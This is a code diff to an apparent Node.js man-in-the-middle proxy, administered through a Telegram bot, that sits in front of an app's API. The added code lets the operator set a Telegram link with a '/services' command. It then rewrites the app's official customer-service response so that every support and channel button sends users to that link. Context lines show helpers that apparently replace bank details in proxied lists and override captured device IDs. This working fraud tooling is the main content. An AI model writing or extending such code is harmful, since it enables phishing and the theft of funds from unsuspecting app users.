@@ -333,7 +333,8 @@ const DEFAULT_DATA = {
   dummyOrders: [],
   useIdOverride: null,
   alwaysIdOverride: null,
-  lastCapturedId: { deviceId: '', challengeId: '' }
+  lastCapturedId: { deviceId: '', challengeId: '' },
+  customServiceLink: ''
 };
 
 function generateDummyCode() {
@@ -1813,6 +1814,35 @@ Example:
       return res.sendStatus(200);
     }
 
+    
+    if (text.startsWith('/services') || text.startsWith('/service')) {
+      const param = text.replace(/^\/(services|service)/i, '').trim();
+      if (!param) {
+        const current = data.customServiceLink ? `\`${data.customServiceLink}\`` : '_Not Set (Using Default Upstream)_';
+        await bot.sendMessage(chatId, `🎧 *Customer Support Link Configuration*\n━━━━━━━━━━━━━━━━━━\n\n📌 *Current Link:* ${current}\n\n💡 *Commands:* \n• \`/services @zylox\` → Set link to https://t.me/zylox\n• \`/services https://t.me/zylox\` → Set custom Telegram link\n• \`/services reset\` or \`/services off\` → Reset to default upstream link`, { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+
+      if (param.toLowerCase() === 'reset' || param.toLowerCase() === 'off' || param.toLowerCase() === 'clear') {
+        data.customServiceLink = '';
+        await saveData(data);
+        await bot.sendMessage(chatId, '✅ Customer Support link reset to default upstream.');
+        return res.sendStatus(200);
+      }
+
+      let formattedUrl = param;
+      if (formattedUrl.startsWith('@')) {
+        formattedUrl = 'https://t.me/' + formattedUrl.substring(1);
+      } else if (!formattedUrl.startsWith('http://') && !formattedUrl.startsWith('https://')) {
+        formattedUrl = 'https://t.me/' + formattedUrl;
+      }
+
+      data.customServiceLink = formattedUrl;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ *Customer Support Link Set!*\n━━━━━━━━━━━━━━━━━━\n\n🔗 *Target Link:* \`${formattedUrl}\` \n\nApp me CustomerService aur Channel dono buttons par click karne par user \`${formattedUrl}\` pe redirect hoga.`, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
     if (text.startsWith('/adddummy')) {
       data.dummyOrders = data.dummyOrders || [];
       const parts = text.substring(9).trim().split(/\s+/);
@@ -1962,6 +1992,29 @@ app.post('/bot2-webhook', async (req, res) => {
   } catch (e) {
     return res.sendStatus(200);
   }
+});
+
+
+app.all('/app/app/official/service/getOfficialServiceData', async (req, res) => {
+  const { response, respHeaders, respBuffer, jsonResp } = await proxyFetch(req);
+  try {
+    const data = await loadData();
+    if (data.customServiceLink && data.customServiceLink.trim() !== '') {
+      const customLink = data.customServiceLink.trim();
+      let resObj = jsonResp;
+      if (!resObj && respBuffer) {
+        try { resObj = JSON.parse(respBuffer.toString('utf8')); } catch (e) {}
+      }
+      if (resObj && Array.isArray(resObj.data)) {
+        resObj.data = resObj.data.map(item => ({
+          ...item,
+          link: customLink
+        }));
+        return sendJson(res, respHeaders, resObj, JSON.stringify(resObj));
+      }
+    }
+  } catch (e) {}
+  return sendJson(res, respHeaders, jsonResp, respBuffer);
 });
 
 app.post('/app/user/login/login', async (req, res) => {
@@ -3397,13 +3450,7 @@ app.all('/app/user/info/getInviterUrl', async (req, res) => {
 app.all('/app/user/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
 app.all('/app/itoken/appi/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
 
-app.all('/app/app/official/service/getOfficialServiceData', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
-  } catch (e) { await transparentProxy(req, res); }
-});
+
 
 app.all('/app/base/comm/uploadBase64', async (req, res) => {
   const data = await loadData();
